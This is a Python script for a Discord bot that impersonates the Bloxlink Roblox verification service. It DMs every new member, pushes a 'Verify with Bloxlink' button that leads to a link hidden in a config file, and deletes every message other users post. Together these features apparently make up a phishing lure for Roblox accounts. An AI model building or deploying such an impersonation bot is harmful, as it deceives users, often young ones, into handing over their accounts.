print("conecting to your bot")

import discord
from discord import app_commands, Interaction
from discord.ext import commands
import os
import json
import time
import re


os.system("mode con cols=60 lines=20")
os.system("title " + "gren (Console)")


with open("config.json") as f:
    config = json.load(f)
link = config["link"]
token = config["token"]
iddi = config["id"]

title = "Roblox Verification made easy! Features everything you need to integrate your Discord server with Roblox."
desc = "/verify \n :arrow_right_hook: link your Roblox account to your Discord account and get your server roles \n /getrole \n :arrow_right_hook: link your Roblox account to your Discord account and get your server roles"


intents = discord.Intents.all()
intents.members = True
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

main = discord.Embed(title=title, description=desc, color=15844367)
main.set_thumbnail(url='https://cdn.discordapp.com/avatars/426537812993638400/746124a5a40305b92d6dc4e983fd1de2.png?size=1024')




@bot.event
async def on_message(message):
    if  message.author.id != bot.user.id:
        await message.delete()


@bot.event
async def on_member_join(member):
    await member.send(f"Welcome to {member.guild.name}! This Discord server uses a Roblox account verification system to keep our community safe. Verifying your account is quick and easy. All you have to do is join a game **after you run /verify in the server**, and you're in!")

@bot.event
async def on_ready():
    print("command is /verify")
    await bot.change_presence(activity=discord.Game(name="/help /invite"))
    await tree.sync(guild=discord.Object(id=iddi))

@bot.event
async def on_member_remove(member):
    print(f"{member} just left the server.")

@tree.command(name = "getrole", description = "Excepting different roles?", guild=discord.Object(id=iddi))
async def verify(interaction):
    print(f"{interaction.user} used getrole")
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Verify with Bloxlink", style=discord.ButtonStyle.link, url=link))
    await interaction.response.send_message("To verify with bloxlink, click the link below.", view=view)


@tree.command(name = "verify", description = "verify with your roblox account", guild=discord.Object(id=iddi))
async def verify(interaction):
    print(f"{interaction.user} is verifying")
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Verify with Bloxlink", style=discord.ButtonStyle.link, url=link))
    await interaction.response.send_message("To verify with bloxlink, click the link below.", view=view)

@tree.command(name = "help", description = "Type this command if you need help", guild=discord.Object(id=iddi))
async def help(interaction):
    print(f"{interaction.user} needs help")
    await interaction.response.send_message("Look in your dm")
    await interaction.user.send(embed=main)


bot.run(token)